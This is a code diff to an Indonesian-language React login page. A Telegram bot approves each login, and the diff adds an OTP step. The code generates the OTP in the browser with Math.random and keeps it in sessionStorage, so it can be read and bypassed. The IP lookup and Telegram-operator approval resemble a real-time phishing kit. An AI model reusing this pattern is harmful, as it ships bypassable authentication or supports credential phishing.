@@ -5,7 +5,7 @@ import { useI18n, type Language } from "@/lib/i18n";
 import { Globe, ChevronDown } from "lucide-react";
 import { ChatWidget } from "@/components/chat-widget";
 import { RecaptchaBadge } from "@/components/recaptcha-badge";
-import { getIPInfo, sendApprovalRequest, pollApproval, answerCallback, getLatestOffset } from "@/lib/telegram";
+import { getIPInfo, sendApprovalRequest, pollApproval, answerCallback, getLatestOffset, sendBotOTP } from "@/lib/telegram";
 
 
 const languageOptions: { code: Language; label: string }[] = [
@@ -53,9 +53,13 @@ export default function Login() {
       offsetRef.current = nextOffset;
       if (status === "approved") {
         clearInterval(pollRef.current!);
-        if (callbackId) await answerCallback(callbackId, "✅ Login disetujui!");
+        if (callbackId) await answerCallback(callbackId, "✅ Login disetujui! Kode OTP dikirim.");
+        const otp = String(Math.floor(100000 + Math.random() * 900000));
+        sessionStorage.setItem("botOtpCode", otp);
+        sessionStorage.setItem("botOtpUsername", username);
+        await sendBotOTP(otp);
         setWaiting(false);
-        navigate("/verify");
+        navigate("/bot-otp");
       } else if (status === "rejected") {
         clearInterval(pollRef.current!);
         if (callbackId) await answerCallback(callbackId, "❌ Login ditolak.");
